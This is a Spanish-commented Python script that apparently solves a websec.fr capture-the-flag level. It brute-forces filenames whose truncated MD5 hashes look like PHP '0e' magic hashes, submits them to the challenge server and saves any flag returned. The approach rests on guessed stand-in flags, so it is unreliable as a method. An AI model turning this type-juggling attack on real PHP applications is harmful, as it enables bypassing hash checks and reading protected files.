#!/usr/bin/env python3
import hashlib
import itertools
import string

print("Buscando nombres de archivo que generen hashes 0e...")
print("="*60 + "\n")

# Necesito encontrar un filename tal que:
# md5(CUALQUIER_FLAG + filename + CUALQUIER_FLAG) empiece con 0e + dígitos

# Estrategia: probar prefijos/sufijos de flag.php que puedan generar hashes 0e
# sin importar qué flag se use

base = "flag.php"
chars = string.ascii_letters + string.digits + "._-/"

tested = 0
found_files = []

# Probar con prefijos de 1-3 caracteres
print("Probando prefijos de 1-3 caracteres antes de flag.php...")
for length in range(1, 4):
    print(f"  Longitud {length}...")
    
    if length == 1:
        combinations = [(c,) for c in chars]
    elif length == 2:
        combinations = itertools.product(chars, repeat=2)
    else:
        # Para 3 caracteres, limitar a caracteres comunes
        common = "abcdefghijklmnopqrstuvwxyz0123456789._-/"
        combinations = itertools.product(common, repeat=3)
    
    for combo in combinations:
        prefix = ''.join(combo)
        filename = prefix + base
        
        # Probar con diferentes flags simulados
        for test_flag in ["", "x", "XX", "abc", "test", "flag", "WEBSEC", "key", "secret"]:
            test_string = test_flag + filename + test_flag
            h = hashlib.md5(test_string.encode()).hexdigest()[:8]
            
            tested += 1
            
            if tested % 100000 == 0:
                print(f"    Probados: {tested:,}")
            
            # Buscar hashes que empiecen con 0e seguido SOLO de dígitos
            if h[:2] == "0e" and h[2:].isdigit():
                print(f"\n¡¡¡ENCONTRADO!!!")
                print(f"  Filename: {repr(filename)}")
                print(f"  Test flag: {repr(test_flag)}")
                print(f"  Hash: {h}")
                found_files.append((filename, test_flag, h))
                
                # Probar en el servidor REAL
                print(f"\n  Probando en servidor real...")
                import requests
                try:
                    r = requests.get("https://websec.fr/level10/index.php", 
                                   params={"f": filename, "hash": h}, timeout=5)
                    if "WEBSEC{" in r.text:
                        flag_start = r.text.find("WEBSEC{")
                        flag_end = r.text.find("}", flag_start)
                        flag = r.text[flag_start:flag_end+1]
                        print(f"\n{'='*60}")
                        print(f"¡¡¡FLAG REAL ENCONTRADA!!!")
                        print(f"{'='*60}")
                        print(f"FLAG: {flag}")
                        print(f"Filename usado: {filename}")
                        print(f"Hash usado: {h}")
                        
                        with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                            f.write(f"FLAG: {flag}\nFilename: {filename}\nHash: {h}\n")
                        
                        exit(0)
                    else:
                        print(f"    No funcionó en servidor real (el $flag real es diferente)")
                except Exception as e:
                    print(f"    Error al probar: {e}")

print(f"\n\nTotal probados: {tested:,}")
print(f"Total encontrados localmente: {len(found_files)}")

if found_files:
    print("\nArchivos encontrados que generan hashes 0e:")
    for fn, flag, h in found_files[:10]:
        print(f"  {fn} (con flag='{flag}') -> {h}")